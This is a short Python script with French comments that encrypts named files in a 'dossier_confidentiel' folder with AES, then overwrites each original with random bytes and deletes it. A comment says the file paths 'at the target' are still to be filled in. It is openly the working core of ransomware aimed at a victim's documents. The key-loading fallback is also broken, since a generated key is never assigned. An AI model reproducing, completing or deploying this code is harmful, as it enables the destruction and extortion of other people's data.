import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from generate_key import generate_key

def load_key(keyfile_path):
    with open(keyfile_path, 'rb') as keyfile:
        return keyfile.read()

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.iv + cipher.encrypt(pad(file_data, AES.block_size))
    return ciphertext

def secure_delete(file_path):
    try:
        with open(file_path, 'r+b') as f:
            file_size = os.path.getsize(file_path)
            f.write(os.urandom(file_size))
        os.remove(file_path)
    except Exception as e:
        print(f"Erreur lors de la suppression sécurisée de {file_path}: {e}")
        
if __name__ == '__main__':
    keyfile_path = "keyfile.key"
    try:
        key = load_key(keyfile_path)
    except Exception as e:
        generate_key()
        
    # Ici on devra mettre le path exact des fichiers qu'on cherche à chiffrer chez la cible
    files_to_encrypt = ["dossier_confidentiel/Contrat_de_Prestation.docx", "dossier_confidentiel/Achats_Fournitures.xlsx"]

    encrypted_files = {}
    for file_path in files_to_encrypt:
        ciphertext = encrypt_file(file_path, key)
        encrypted_file_path = file_path + ".enc"
        with open(encrypted_file_path, 'wb') as f:
            f.write(ciphertext)
        encrypted_files[file_path] = encrypted_file_path
        secure_delete(file_path)

